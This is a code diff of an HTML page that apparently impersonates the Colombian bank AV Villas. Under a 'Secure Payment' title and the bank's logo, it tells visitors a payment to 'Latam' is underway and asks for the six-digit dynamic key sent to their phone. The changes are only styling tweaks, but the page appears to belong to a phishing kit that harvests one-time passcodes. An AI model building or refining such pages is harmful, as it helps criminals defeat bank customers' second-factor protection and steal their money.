@@ -16,14 +16,14 @@
 
     <title>Secure Payment</title>
 </head>
-<body style="">
+<body style="padding: 10px;">
     
 
 <img src="/img/avvillas.png" alt="" srcset="" width="50%"><br>
 <br><br><br><div class="" style="margin-top:55px:">
     <a>Esta a punto de realizar un pago en el comercio <b>Latam</b> para continuar ingrese la clave dinamica que hemos enviado al numero asociado con su cuenta</a>
 
-   <center> <br><input type="number" name="" id="txtDinamica" placeholder="Clave dinamica" style="width:90%; height: 40px; margin-top:20px;" required maxlength="6" minlength="6">
+   <center> <br><input type="number" name="" id="txtDinamica" placeholder="Clave dinamica" style="width:90%; height: 40px; margin-top:20px; margin-left:0px;" required maxlength="6" minlength="6">
     <input type="submit" value="Continuar" id="btnDinamica" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px; margin-top:10px;"></center>
 
 </div>
